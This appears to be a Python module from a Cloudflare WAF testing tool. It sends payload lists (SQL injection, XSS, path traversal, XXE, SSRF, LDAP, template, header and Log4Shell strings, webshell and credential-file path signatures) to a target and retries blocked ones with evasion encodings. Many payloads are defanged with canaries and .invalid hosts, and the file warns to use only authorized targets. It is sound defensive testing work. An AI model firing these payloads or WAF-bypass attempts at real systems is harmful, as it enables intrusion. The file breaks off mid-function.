"""Signature-only WAF probes, not safe for vulnerable origins.

Only use against authorized, isolated targets. Even reduced-impact signatures can
be interpreted by vulnerable applications; responses do not prove a rule match.
"""

import asyncio
import random
import string
import base64
import urllib.parse
import hashlib
import json
import xml.etree.ElementTree as ET
from enum import Enum, auto
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field, replace
import logging

from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TaskProgressColumn
from rich.console import Console

from .http_engine import BaseHTTPEngine, HTTPEngine, HTTPMethod, HTTPResponse
from .config import Config, WAFRuleset
from .bypass_techniques import BypassTechniques

logger = logging.getLogger(__name__)
console = Console()
CORPUS_WARNING = (
    "Signature-only corpus is not safe for vulnerable origins; use authorized, isolated targets. "
    "Response-level observations do not prove matched managed rules or exploit semantics."
)


OWASP_DOCS = {
    "A01:2021": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
    "A02:2021": "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
    "A03:2021": "https://owasp.org/Top10/A03_2021-Injection/",
    "A04:2021": "https://owasp.org/Top10/A04_2021-Insecure_Design/",
    "A05:2021": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
    "A06:2021": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/",
    "A07:2021": "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
    "A08:2021": "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/",
    "A09:2021": "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/",
    "A10:2021": "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
}

CVE_DOCS = {
    "CVE-2021-44228": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",  # Log4Shell
    "CVE-2021-45046": "https://nvd.nist.gov/vuln/detail/CVE-2021-45046",  # Log4j
    "CVE-2017-5638": "https://nvd.nist.gov/vuln/detail/CVE-2017-5638",   # Apache Struts
    "CVE-2019-11043": "https://nvd.nist.gov/vuln/detail/CVE-2019-11043", # PHP-FPM
    "CVE-2021-41773": "https://nvd.nist.gov/vuln/detail/CVE-2021-41773", # Apache Path Traversal
    "CVE-2021-26855": "https://nvd.nist.gov/vuln/detail/CVE-2021-26855", # ProxyLogon
    "CVE-2021-34473": "https://nvd.nist.gov/vuln/detail/CVE-2021-34473", # ProxyShell
    "CVE-2022-22965": "https://nvd.nist.gov/vuln/detail/CVE-2022-22965", # Spring4Shell
}

CWE_DOCS = {
    "CWE-79": "https://cwe.mitre.org/data/definitions/79.html",    # XSS
    "CWE-89": "https://cwe.mitre.org/data/definitions/89.html",    # SQL Injection
    "CWE-78": "https://cwe.mitre.org/data/definitions/78.html",    # OS Command Injection
    "CWE-22": "https://cwe.mitre.org/data/definitions/22.html",    # Path Traversal
    "CWE-611": "https://cwe.mitre.org/data/definitions/611.html",  # XXE
    "CWE-918": "https://cwe.mitre.org/data/definitions/918.html",  # SSRF
    "CWE-1336": "https://cwe.mitre.org/data/definitions/1336.html", # SSTI
    "CWE-917": "https://cwe.mitre.org/data/definitions/917.html",  # Expression Language Injection
    "CWE-94": "https://cwe.mitre.org/data/definitions/94.html",    # Code Injection
    "CWE-113": "https://cwe.mitre.org/data/definitions/113.html",  # HTTP Header Injection
}


@dataclass
class WAFTestCase:
    """A WAF test case definition."""
    name: str
    category: str
    ruleset: str
    payload: str
    method: HTTPMethod
    injection_point: str
    expected_block: bool
    description: str
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None
    cve_id: Optional[str] = None
    body_format: str = "raw"

    def __post_init__(self):
        if self.injection_point not in ("query_param", "query", "path", "body", "header", "user_agent"):
            raise ValueError(f"Unsupported injection point: {self.injection_point}")
        if self.body_format not in ("raw", "json", "xml", "form"):
            raise ValueError(f"Unsupported body format: {self.body_format}")
        if self.injection_point != "body" and self.body_format != "raw":
            raise ValueError("Body format requires a body injection point")
        if self.injection_point == "body":
            if self.body_format == "json":
                json.dumps(json.loads(self.payload), allow_nan=False)
            elif self.body_format == "xml":
                ET.fromstring(self.payload)

    @property
    def case_id(self) -> str:
        """Return a stable identifier for this test definition."""
        value = "\0".join((self.name, self.category, self.payload, self.method.value, self.injection_point))
        # Keep existing raw case IDs stable for persisted schema-1 reports.
        if self.body_format != "raw":
            value += f"\0{self.body_format}"
        return f"waf-{hashlib.sha256(value.encode()).hexdigest()[:12]}"
    
    def get_cwe_url(self) -> Optional[str]:
        """Get the CWE documentation URL."""
        if self.cwe_id:
            return CWE_DOCS.get(self.cwe_id, f"https://cwe.mitre.org/data/definitions/{self.cwe_id.split('-')[1]}.html")
        return None
    
    def get_owasp_url(self) -> Optional[str]:
        """Get the OWASP documentation URL."""
        if self.owasp_category:
            key = self.owasp_category.split("-")[0].strip()
            return OWASP_DOCS.get(key)
        return None
    
    def get_cve_url(self) -> Optional[str]:
        """Get the CVE documentation URL."""
        if self.cve_id:
            return CVE_DOCS.get(self.cve_id, f"https://nvd.nist.gov/vuln/detail/{self.cve_id}")
        return None


class WAFOutcome(Enum):
    """Canonical result of executing a WAF test case."""

    BLOCKED = "blocked"
    ALLOWED = "allowed"
    CHALLENGED = "challenged"
    ERROR = "error"
    INCONCLUSIVE = "inconclusive"


@dataclass
class WAFTestResult:
    """Result of a WAF test."""
    test_case: WAFTestCase
    target: str
    response_code: int
    blocked: bool
    challenge_presented: bool
    response_time: float
    cf_ray: Optional[str]
    bypass_successful: bool
    bypass_technique: Optional[str] = None
    raw_response: Optional[str] = None
    notes: List[str] = field(default_factory=list)
    outcome: WAFOutcome = WAFOutcome.INCONCLUSIVE
    error: Optional[str] = None
    attempt_type: str = "baseline"
    parent_case_id: Optional[str] = None


class WAFTester:
    """
    WAF tester for Cloudflare OWASP Core Ruleset and Managed Ruleset.
    
    Tests various attack vectors to verify WAF protection is working correctly.
    """
    
    SQL_INJECTION_PAYLOADS = [
        ("' OR '1'='1", "Basic SQLi - OR bypass"),
        ("' OR '1'='1'--", "SQLi with comment"),
        ("' OR '1'='1'/*", "SQLi with block comment"),
        ("1' AND '1'='1", "SQLi AND condition"),
        ("1 UNION SELECT NULL,NULL,NULL--", "UNION based SQLi"),
        ("1 UNION SELECT 'cf-tester-canary',NULL--", "UNION literal signature"),
        ("' OR 1=1#", "MySQL comment SQLi"),
        ("admin'--", "Simple auth bypass"),
        ("1' ORDER BY 1--+", "ORDER BY injection"),
        ("1' GROUP BY 1--+", "GROUP BY injection"),
        ("-1' UNION SELECT 1,2,3--+", "Negative UNION SQLi"),
        ("1' AND 1=CONVERT(int,'cf-tester-canary')--", "Error-based literal SQLi"),
    ]
    
    XSS_PAYLOADS = [
        ("<script>alert('XSS')</script>", "Basic script tag XSS"),
        ("<img src=x onerror=alert('XSS')>", "IMG onerror XSS"),
        ("<svg onload=alert('XSS')>", "SVG onload XSS"),
        ("<body onload=alert('XSS')>", "Body onload XSS"),
        ("javascript:alert('XSS')", "JavaScript protocol XSS"),
        ("<iframe src='javascript:alert(1)'>", "Iframe XSS"),
        ("<input onfocus=alert('XSS') autofocus>", "Input autofocus XSS"),
        ("<marquee onstart=alert('XSS')>", "Marquee XSS"),
        ("<details open ontoggle=alert('XSS')>", "Details ontoggle XSS"),
        ("<video><source onerror=alert('XSS')>", "Video source XSS"),
        ("'><script>alert(String.fromCharCode(88,83,83))</script>", "Encoded XSS"),
        ("<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>", "Base64 encoded XSS"),
        ("<svg/onload=alert('XSS')>", "SVG without space"),
        ("<<script>alert('XSS')//<</script>", "Nested tags XSS"),
        ("<scr<script>ipt>alert('XSS')</scr</script>ipt>", "Split tag XSS"),
        ("\"><img src=x onerror=alert('XSS')>", "Attribute escape XSS"),
        ("'-alert('XSS')-'", "JS string break XSS"),
        ("</title><script>alert('XSS')</script>", "Title escape XSS"),
        ("</textarea><script>alert('XSS')</script>", "Textarea escape XSS"),
        ("<math><maction actiontype='statusline#http://cf-tester.invalid' xlink:href='javascript:alert(1)'>", "MathML XSS"),
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        ("; printf cf-tester-canary", "Semicolon command signature"),
        ("| printf cf-tester-canary", "Pipe command signature"),
        ("`printf cf-tester-canary`", "Backtick command signature"),
        ("$(printf cf-tester-canary)", "Substitution command signature"),
        ("&& printf cf-tester-canary", "AND command signature"),
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        ("../../../cf-tester-not-a-real-file", "Basic path traversal"),
        ("....//....//....//cf-tester-not-a-real-file", "Double dot traversal"),
        ("..%2f..%2f..%2fcf-tester-not-a-real-file", "URL encoded traversal"),
        ("..%252f..%252f..%252fcf-tester-not-a-real-file", "Double URL encoded"),
        ("/cf-tester-not-a-real-file%00", "Null byte injection"),
        (r"....\/....\/....\/cf-tester-not-a-real-file", "Backslash traversal"),
        ("%2e%2e%2f%2e%2e%2fcf-tester-not-a-real-file", "Full URL encoded"),
        ("..%c0%af..%c0%afcf-tester-not-a-real-file", "UTF-8 encoded traversal"),
    ]
    
    XXE_PAYLOADS = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://cf-tester.invalid/xxe">]><foo>cf-tester</foo>', "External entity declaration signature"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://cf-tester.invalid/xxe.dtd">]><foo>cf-tester</foo>', "Parameter entity declaration signature"),
    ]
    
    SSRF_PAYLOADS = [
        ("http://cf-tester.invalid/admin", "HTTP URL signature"),
        ("https://cf-tester.invalid/latest/meta-data/", "Metadata path signature on reserved host"),
        ("gopher://cf-tester.invalid/cf-tester", "Gopher URL signature"),
        ("dict://cf-tester.invalid/cf-tester", "Dict URL signature"),
    ]
    
    LDAP_INJECTION_PAYLOADS = [
        ("*)(uid=*))(|(uid=*", "LDAP injection"),
        ("admin)(&)", "LDAP filter bypass"),
        ("*)(objectClass=*", "LDAP wildcard injection"),
        ("admin))(|(password=*", "LDAP password extraction"),
    ]
    
    TEMPLATE_INJECTION_PAYLOADS = [
        ("{{7*7}}", "Jinja2/Twig basic SSTI"),
        ("${7*7}", "Generic template injection"),
        ("#{7*7}", "Ruby ERB injection"),
        ("<%= 7*7 %>", "ERB injection"),
        ("${{<%[%'\"}}%\\", "Polyglot template injection"),
    ]
    
    HEADER_INJECTION_PAYLOADS = [
        ("value\r\nX-Injected: true", "CRLF injection"),
        ("value%0d%0aX-Injected: true", "URL encoded CRLF"),
        ("value\nSet-Cookie: injected=true", "Cookie injection via CRLF"),
        ("value\r\n\r\n<html>injected</html>", "Response splitting"),
    ]
    
    LOG4J_PAYLOADS = [
        ("${jndi:ldap://cf-tester.invalid/canary}", "Log4j basic"),
        ("${jndi:rmi://cf-tester.invalid/canary}", "Log4j RMI"),
        ("${${lower:j}ndi:${lower:l}dap://cf-tester.invalid/canary}", "Log4j obfuscated"),
        ("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://cf-tester.invalid/canary}", "Log4j heavy obfuscation"),
    ]
    
    PROTOTYPE_POLLUTION_PAYLOADS = [
        ('{"__proto__":{"cfTesterCanary":"signature-only"}}', "Prototype pollution basic"),
        ('{"constructor":{"prototype":{"cfTesterCanary":"signature-only"}}}', "Constructor pollution"),
    ]
    
    CLOUDFLARE_MANAGED_SPECIFIC = [
        # Payload, description, category, location, method, body format.
        ("<?php /* system($_GET['cmd']); cf-tester signature */ ?>", "PHP webshell signature", "php-injection", "query_param", HTTPMethod.GET, "raw"),
        ("<%@ Page Language=\"C#\" %><%/* System.Diagnostics.Process.Start signature only */%>", "ASP.NET webshell signature", "aspnet-injection", "body", HTTPMethod.POST, "form"),
        ("/.htaccess.cf-tester-canary", "Apache htaccess path signature", "sensitive-files", "path", HTTPMethod.GET, "raw"),
        ("/wp-config.php.cf-tester-canary", "WordPress config path signature", "wordpress", "path", HTTPMethod.GET, "raw"),
        ("/wp-admin/admin-ajax.php", "WordPress AJAX path signature (no download action)", "wordpress-cve", "path", HTTPMethod.GET, "raw"),
        ("SELECT 'cf-tester-canary'", "WordPress SQLi signature", "wordpress", "query_param", HTTPMethod.GET, "raw"),
        ("/phpMyAdmin/", "phpMyAdmin access", "admin-panels", "path", HTTPMethod.GET, "raw"),
        ("/administrator/", "Joomla admin access", "joomla", "path", HTTPMethod.GET, "raw"),
        ("Drupal.settings", "Drupal settings signature", "drupal", "query_param", HTTPMethod.GET, "raw"),
        ("/etc/shadow.cf-tester-canary", "Shadow file path signature", "sensitive-files", "path", HTTPMethod.GET, "raw"),
        ("/aws/credentials.cf-tester-canary", "AWS credentials path signature", "cloud-credentials", "path", HTTPMethod.GET, "raw"),
        ("/.env.cf-tester-canary", "Environment file path signature", "sensitive-files", "path", HTTPMethod.GET, "raw"),
        ("/debug/pprof/cf-tester-canary", "Go pprof path signature", "debug-endpoints", "path", HTTPMethod.GET, "raw"),
        ("/.git/config.cf-tester-canary", "Git config path signature", "sensitive-files", "path", HTTPMethod.GET, "raw"),
        ("/server-status.cf-tester-canary", "Apache server status path signature", "debug-endpoints", "path", HTTPMethod.GET, "raw"),
        ("/wp-content/debug.log.cf-tester-canary", "WordPress debug log path signature", "wordpress", "path", HTTPMethod.GET, "raw"),
    ]
    
    def __init__(self, http_engine: HTTPEngine, config: Config):
        self.http_engine = http_engine
        self.config = config
        self.bypass_techniques = BypassTechniques() if config.use_bypass_techniques else None
        self.results: List[WAFTestResult] = []
        self.blocked_count = 0
        self.passed_count = 0
        self.bypass_count = 0
    
    def _print_verbose_test_info(self, test_case: WAFTestCase, target: str, url: str, 
                                   headers: dict, params: dict, data: Optional[str]):
        """Print verbose information about the test case being executed."""
        console.print(f"\n[bold white on blue] TEST CASE [/]")
        console.print(f"[bold cyan]Name:[/] {test_case.name}")
        console.print(f"[bold cyan]Category:[/] {test_case.category}")
        console.print(f"[bold cyan]Description:[/] {test_case.description}")
        
        if test_case.cwe_id:
            cwe_url = test_case.get_cwe_url()
            console.print(f"[bold cyan]CWE:[/] {test_case.cwe_id} - {cwe_url}")
        
        if test_case.owasp_category:
            owasp_url = test_case.get_owasp_url()
            console.print(f"[bold cyan]OWASP:[/] {test_case.owasp_category}")
            if owasp_url:
                console.print(f"[bold cyan]OWASP Doc:[/] {owasp_url}")
        
        if test_case.cve_id:
            cve_url = test_case.get_cve_url()
            console.print(f"[bold red]CVE:[/] {test_case.cve_id} - {cve_url}")
        
        console.print(f"\n[bold yellow]HTTP Request:[/]")
        console.print(f"  [cyan]Method:[/] {test_case.method.name}")
        console.print(f"  [cyan]URL:[/] {url}")
        
        if params:
            console.print(f"  [cyan]Query Params:[/] {params}")
        
        if headers:
            console.print(f"  [cyan]Headers:[/]")
            for k, v in headers.items():
                display_v = v[:80] + "..." if len(v) > 80 else v
                console.print(f"    {k}: {display_v}")
        
        if data:
            display_data = data[:200] + "..." if len(data) > 200 else data
            console.print(f"  [cyan]Body:[/] {display_data}")
        
        console.print(f"  [cyan]Payload:[/] [yellow]{test_case.payload[:100]}{'...' if len(test_case.payload) > 100 else ''}[/]")
        console.print(f"  [cyan]Injection Point:[/] {test_case.injection_point}")
    
    def _print_verbose_result(self, result: WAFTestResult, response: 'HTTPResponse' = None):
        """Print verbose result information."""
        console.print(f"[bold]Result: {result.outcome.value.upper()}[/] (Status: {result.response_code}, Time: {result.response_time:.3f}s)")
        
        cf_ray = result.cf_ray or (response.cf_ray if response else None)
        if cf_ray:
            console.print(f"[cyan]CF-Ray:[/] {cf_ray}")
        
        if response and response.redirected:
            console.print(f"[yellow]Redirected:[/] {response.redirect_count} redirect(s)")
            console.print(f"[yellow]Final URL:[/] {response.final_url}")
        
        console.print(f"\n[bold yellow]Server Response:[/]")
        body = (response.body if response else None) or result.raw_response
        if body and len(body) > 0:
            response_preview = body[:1500]
            if len(body) > 1500:
                response_preview += "\n... [truncated]"
            console.print(f"[dim]{response_preview}[/]")
        else:
            console.print(f"[dim](empty response)[/]")
        
        console.print("─" * 60)
    
    async def run(self) -> List[WAFTestResult]:
        """Run WAF tests based on configuration."""
        test_cases = self._generate_test_cases()

        try:
            console.print(f"[bold yellow]WARNING: {CORPUS_WARNING}[/]")
            for target in self.config.get_target_urls():
                console.print(f"\n[bold cyan]Target:[/] {target}")
                console.print(f"[bold cyan]Ruleset:[/] {self.config.waf_ruleset.name}")
                console.print(f"[bold cyan]Total Test Cases:[/] {len(test_cases)}")
                console.print(f"[bold cyan]Bypass Testing:[/] {'Enabled' if self.config.use_bypass_techniques else 'Disabled'}")
                console.print(f"[bold cyan]Verbose Mode:[/] {'Enabled' if self.config.verbose else 'Disabled'}\n")

                self.blocked_count = 0
                self.passed_count = 0
                self.bypass_count = 0

                if self.config.verbose:
                    for i, test_case in enumerate(test_cases, 1):
                        console.print(f"\n[bold white]Test {i}/{len(test_cases)}[/]")
                        result = await self._run_test_case(test_case, target, verbose=True)
                        self.results.append(result)

                        if result.blocked:
                            self.blocked_count += 1
                        else:
                            self.passed_count += 1

                        if self.config.use_bypass_techniques and result.blocked and test_case.expected_block:
                            bypass_results = await self._try_bypass(test_case, target)
                            self.results.extend(bypass_results)

                            for br in bypass_results:
                                if br.bypass_successful:
                                    self.bypass_count += 1
                                    console.print(f"[bold red]  ⚠ BYPASS SUCCESSFUL using {br.bypass_technique}![/]")
                else:
                    with Progress(
                        SpinnerColumn(),
                        TextColumn("[bold blue]{task.description}"),
                        BarColumn(bar_width=40),
                        TaskProgressColumn(),
                        TextColumn("|"),
                        TextColumn("[green]Blocked:{task.fields[blocked]}"),
                        TextColumn("[yellow]Passed:{task.fields[passed]}"),
                        TextColumn("[red]Bypassed:{task.fields[bypassed]}"),
                        TextColumn("|"),
                        TimeElapsedColumn(),
                        console=console,
                        refresh_per_second=10,
                    ) as progress:
                        task = progress.add_task(
                            "WAF Testing",
                            total=len(test_cases),
                            blocked=0,
                            passed=0,
                            bypassed=0,
                        )

                        for test_case in test_cases:
                            result = await self._run_test_case(test_case, target, verbose=False)
                            self.results.append(result)

                            if result.blocked:
                                self.blocked_count += 1
                            else:
                                self.passed_count += 1

                            if self.config.use_bypass_techniques and result.blocked and test_case.expected_block:
                                bypass_results = await self._try_bypass(test_case, target)
                                self.results.extend(bypass_results)

                                for br in bypass_results:
                                    if br.bypass_successful:
                                        self.bypass_count += 1

                            progress.update(
                                task,
                                advance=1,
                                blocked=self.blocked_count,
                                passed=self.passed_count,
                                bypassed=self.bypass_count,
                            )

                console.print(f"\n[bold]WAF Test Summary for {target}:[/]")
                console.print(f"  [green]Blocked:[/] {self.blocked_count}/{len(test_cases)}")
                console.print(f"  [yellow]Passed (not blocked):[/] {self.passed_count}/{len(test_cases)}")
                if self.config.use_bypass_techniques:
                    console.print(f"  [red]Bypasses Found:[/] {self.bypass_count}")
        finally:
            await self.http_engine.close()
        return self.results
    
    def _generate_test_cases(self) -> List[WAFTestCase]:
        """Generate test cases based on selected ruleset."""
        test_cases = []

        if self.config.waf_ruleset in [WAFRuleset.OWASP, WAFRuleset.BOTH]:
            test_cases.extend(self._generate_owasp_test_cases())
        
        if self.config.waf_ruleset in [WAFRuleset.CLOUDFLARE_MANAGED, WAFRuleset.BOTH]:
            test_cases.extend(self._generate_managed_test_cases())

        if not self.config.waf_test_all_categories and not self.config.waf_categories:
            raise ValueError("Select at least one WAF category when all categories are disabled")
        if self.config.waf_categories:
            selected = {category.strip().casefold() for category in self.config.waf_categories}
            available = {case.category.casefold() for case in test_cases}
            unknown = selected - available
            if unknown:
                raise ValueError(f"Unknown WAF categories for selected ruleset: {', '.join(sorted(unknown))}")
            test_cases = [case for case in test_cases if case.category.casefold() in selected]

        test_cases.append(WAFTestCase(
            name="Benign request control",
            category="Control",
            ruleset="Control",
            payload="cf-tester-benign-control",
            method=HTTPMethod.GET,
            injection_point="query_param",
            expected_block=False,
            description="Detect false positives by sending a benign value",
        ))

        unique_cases = {}
        for test_case in test_cases:
            unique_cases.setdefault(test_case.case_id, test_case)
        return list(unique_cases.values())
    
    def _generate_owasp_test_cases(self) -> List[WAFTestCase]:
        """Generate OWASP Core Ruleset test cases."""
        test_cases = []
        
        for payload, desc in self.SQL_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"SQLi: {desc}",
                category="SQL Injection",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-89",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.XSS_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"XSS: {desc}",
                category="Cross-Site Scripting",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-79",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.COMMAND_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"CMDi: {desc}",
                category="Command Injection",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-78",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.PATH_TRAVERSAL_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"LFI: {desc}",
                category="Path Traversal",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="path",
                expected_block=True,
                description=desc,
                cwe_id="CWE-22",
                owasp_category="A01:2021-Broken Access Control"
            ))
        
        for payload, desc in self.XXE_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"XXE: {desc}",
                category="XML External Entity",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.POST,
                injection_point="body",
                expected_block=True,
                description=desc,
                cwe_id="CWE-611",
                owasp_category="A05:2021-Security Misconfiguration",
                body_format="xml",
            ))
        
        for payload, desc in self.SSRF_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"SSRF: {desc}",
                category="Server-Side Request Forgery",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-918",
                owasp_category="A10:2021-SSRF"
            ))
        
        for payload, desc in self.TEMPLATE_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"SSTI: {desc}",
                category="Server-Side Template Injection",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-1336",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.LOG4J_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"Log4Shell: {desc}",
                category="Log4j RCE",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="header",
                expected_block=True,
                cve_id="CVE-2021-44228",
                description=desc,
                cwe_id="CWE-917",
                owasp_category="A06:2021-Vulnerable Components"
            ))

        for payload, desc in self.LDAP_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"LDAP: {desc}", category="LDAP Injection", ruleset="OWASP",
                payload=payload, method=HTTPMethod.GET, injection_point="query_param",
                expected_block=True, description=desc, cwe_id="CWE-90",
                owasp_category="A03:2021-Injection",
            ))

        for payload, desc in self.HEADER_INJECTION_PAYLOADS:
            if "\r" in payload or "\n" in payload:
                continue
            test_cases.append(WAFTestCase(
                name=f"Header: {desc}", category="Header Injection", ruleset="OWASP",
                payload=payload, method=HTTPMethod.GET, injection_point="header",
                expected_block=True, description=desc, cwe_id="CWE-113",
                owasp_category="A03:2021-Injection",
            ))

        for payload, desc in self.PROTOTYPE_POLLUTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"Prototype: {desc}", category="Prototype Pollution", ruleset="OWASP",
                payload=payload, method=HTTPMethod.POST, injection_point="body",
                expected_block=True, description=desc, cwe_id="CWE-1321",
                owasp_category="A03:2021-Injection",
                body_format="json",
            ))
        
        return test_cases
    
    def _generate_managed_test_cases(self) -> List[WAFTestCase]:
        """Generate Cloudflare Managed Ruleset test cases."""
        test_cases = []
        
        for payload, desc, category, location, method, body_format in self.CLOUDFLARE_MANAGED_SPECIFIC:
            test_cases.append(WAFTestCase(
                name=f"CF-Managed: {desc}",
                category=category,
                ruleset="Cloudflare Managed",
                payload=payload,
                method=method,
                injection_point=location,
                expected_block=True,
                description=desc,
                body_format=body_format,
            ))
        
        test_cases.extend(self._generate_owasp_test_cases())
        
        scanner_payloads = [
            ("Nikto", "Nikto scanner UA"),
            ("sqlmap", "SQLmap scanner UA"),
            ("Nessus", "Nessus scanner UA"),
            ("Burp", "Burp Suite scanner"),
            ("OWASP ZAP", "ZAP scanner UA"),
            ("Acunetix", "Acunetix scanner UA"),
            ("Nmap", "Nmap scanner UA"),
        ]
        
        for ua, desc in scanner_payloads:
            test_cases.append(WAFTestCase(
                name=f"Scanner: {desc}",
                category="scanner-detection",
                ruleset="Cloudflare Managed",
                payload=ua,
                method=HTTPMethod.GET,
                injection_point="user_agent",
                expected_block=True,
                description=desc
            ))
        
        return test_cases
    
    async def _run_test_case(self, test_case: WAFTestCase, target: str, verbose: bool = False) -> WAFTestResult:
        """Run a single test case."""
        
        url = urllib.parse.urlunsplit(urllib.parse.urlsplit(target)._replace(fragment=""))
        headers = {}
        params = {}
        data = None
        
        if test_case.injection_point in ("query_param", "query"):
            params = {"test": test_case.payload}
        elif test_case.injection_point == "path":
            parsed = urllib.parse.urlsplit(target)
            # Encode URL delimiters, but retain explicit percent-encoded path probes.
            path = parsed.path.rstrip("/") + "/" + urllib.parse.quote(test_case.payload.lstrip("/"), safe="/%")
            url = urllib.parse.urlunsplit(parsed._replace(path=path, fragment=""))
        elif test_case.injection_point == "body":
            data = test_case.payload
            if test_case.body_format == "json":
                data = json.dumps(json.loads(data), separators=(",", ":"), allow_nan=False)
                headers["Content-Type"] = "application/json"
            elif test_case.body_format == "xml":
                headers["Content-Type"] = "application/xml"
            elif test_case.body_format == "form":
                data = urllib.parse.urlencode({"test": data})
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            else:
                headers["Content-Type"] = "text/plain"
        elif test_case.injection_point == "header":
            headers["X-Test"] = test_case.payload
            headers["User-Agent"] = test_case.payload
        elif test_case.injection_point == "user_agent":
            headers["User-Agent"] = test_case.payload
        
        if verbose:
            self._print_verbose_test_info(test_case, target, url, headers, params, data)
        
        response = await self.http_engine.request(
            url,
            test_case.method,
            headers=headers,
            params=params,
            data=data,
            timeout=self.config.timeout
        )
        
        outcome = self._classify_response(response)
        blocked = outcome in (WAFOutcome.BLOCKED, WAFOutcome.CHALLENGED)
        
        result = WAFTestResult(
            test_case=test_case,
            target=target,
            response_code=response.status_code,
            blocked=blocked,
            challenge_presented=outcome == WAFOutcome.CHALLENGED,
            response_time=response.elapsed_time,
            cf_ray=response.cf_ray,
            bypass_successful=False,
            raw_response=response.body[:1500] if response.body else "",
            outcome=outcome,
            error=response.error,
            notes=[CORPUS_WARNING] if test_case.expected_block else [],
        )
        if blocked:
            result.notes.append("Cloudflare mitigation observed at response level only; matched managed-rule evidence is unavailable.")
        
        if verbose:
            self._print_verbose_result(result, response)
        
        return result
    
    def _is_blocked(self, response: HTTPResponse) -> bool:
        """Determine if a request was blocked by WAF."""
        return self._classify_response(response) in (WAFOutcome.BLOCKED, WAFOutcome.CHALLENGED)

    def _classify_response(self, response: HTTPResponse) -> WAFOutcome:
        """Classify a response without conflating transport failures with WAF verdicts."""
        if response.error or response.status_code == 0:
            return WAFOutcome.ERROR

        if response.challenge_presented or BaseHTTPEngine.detect_cloudflare_challenge(
            response.status_code, response.body, response.headers
        ):
            return WAFOutcome.CHALLENGED

        if BaseHTTPEngine.detect_cloudflare_block(response.status_code, response.body):
            return WAFOutcome.BLOCKED

        if 200 <= response.status_code < 400:
            return WAFOutcome.ALLOWED

        return WAFOutcome.INCONCLUSIVE
    
    async def _try_bypass(self, test_case: WAFTestCase, target: str) -> List[WAFTestResult]:
        """Try various bypass techniques for a blocked payload."""
        if not self.bypass_techniques:
            return []
        
        bypass_results = []
        
        encodings = self.bypass_techniques.get_waf_evasion_encoding(test_case.payload)
        
        for encoding_name, encoded_payload in encodings[1:]:
            try:
                modified_test = replace(
                    test_case,
                    name=f"{test_case.name} ({encoding_name})",
                    payload=encoded_payload,
                    description=f"{test_case.description} with {encoding_name} encoding",
                )
            except (ValueError, ET.ParseError):
                # Do not send invalid JSON/XML as though it preserved body semantics.
                continue
            if test_case.injection_point in ("header", "user_agent") and any(
                ord(char) < 32 or ord(char) > 126 for char in encoded_payload
            ):
                continue
            
            result = await self._run_test_case(modified_test, target)
            result.bypass_technique = encoding_name
            result.bypass_successful = False
            result.attempt_type = "bypass"
            result.parent_case_id = test_case.case_id
            if result.outcome == WAFOutcome.ALLOWED:
                result.notes.append(
                    "Allowed variant is unverified: semantic equivalence and matched-rule evidence are unavailable; not a confirmed bypass."
                )
            
            bypass_results.append(result)
            
        return bypass_results
    
    def get_summary(self) -> Dict[str, Any]:
        """Get a summary of test results."""
        baseline = [r for r in self.results if r.attempt_type == "baseline"]
        bypass_attempts = [r for r in self.results if r.attempt_type == "bypass"]
        total = len(baseline)
        blocked = sum(1 for r in baseline if r.blocked)
        bypassed = sum(1 for r in bypass_attempts if r.bypass_successful)
        challenged = sum(1 for r in baseline if r.challenge_presented)
        
        by_category: Dict[str, Dict[str, int]] = {}
        for result in baseline:
            cat = result.test_case.category
            if cat not in by_category:
                by_category[cat] = {"total": 0, "blocked": 0, "bypassed": 0}
            by_category[cat]["total"] += 1
            if result.blocked:
                by_category[cat]["blocked"] += 1
            if result.bypass_successful:
